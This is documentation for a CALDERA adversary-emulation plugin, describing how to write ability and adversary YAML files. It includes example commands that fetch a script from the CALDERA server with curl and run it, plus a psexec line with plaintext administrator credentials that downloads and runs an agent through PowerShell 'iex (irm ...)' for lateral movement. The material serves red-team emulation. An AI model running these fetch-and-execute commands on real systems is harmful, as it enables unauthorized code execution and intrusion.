# CALDERA plugin: Open

This plugin contains:

* Open-source abilities and adversaries
* A filestore
* A basic planner (sequential) which runs all abilities on all hosts in a group

You can quickly add your own abilities and adversaries, both of which are reloaded every time
the core server reboots.

### Adding new abilities

Add a .yml file in the abilities directory, named after a unique ID (UUID-4 is our standard). 
This file should include an ID, name, description, ATT&CK tactic and command.

Below is an example ability:
```
- id: c0da588f-79f0-4263-8998-7496b1a40596
  name: Identify active user
  description: Platform agnostic way to find the active user
  tactic: discovery
  command: |
    whoami
```

As you write commands, note that there are two global variables available, server and group.

A variable is referenced with the syntax #{variable} and can be placed anywhere inside a command. 

* Server/#{server}: The location of CALDERA. Because each agent may have a different reference point
for where CALDERA is (IP, FQDN, etc), if an ability wants to reference CALDERA it should use #{server}. 
* Group/#{group}: The group used in the active operation.

An example of an ability using a variable is shown below. 
```
- id: e9bcdf0d-be08-4aec-bf1e-e73655403d55
  name: Download WIFI tools
  description: Download a set of commands for manipulating WIFI
  tactic: discovery
  technique:
    attack_id: T1016
    name: System Network Configuration Discovery
  command: |
    curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
    chmod +x /tmp/wifi.sh
  cleanup:
    rm /tmp/wifi.sh
```

The example above also demonstrates how any ability can download files from CALDERA. Downloadable files
should live in the filestore directory, of any plugin, then any ability can download them by calling
the /file/download REST endpoint with the filename passed in as a header. 

The group variable is a bit more advanced. This is useful primarily for lateral movement abilities where
the agent may move itself to a new host. A snippet of what this may look like (for PSExec) would be
```
psexec \\127.0.0.1 -u administrator -p password123 Powershell.exe iex (irm -Method Post -Headers @{'file'='54ndc47.ps1'}  #{server}/file/render?group=#{group})
```

Consult the 54ndc47 agent's delivery commands to see the various ways to deploy by specifying (or not specifying) 
a group.

### Adding new adversaries

New adversaries can be added to the adversaries.yml file.


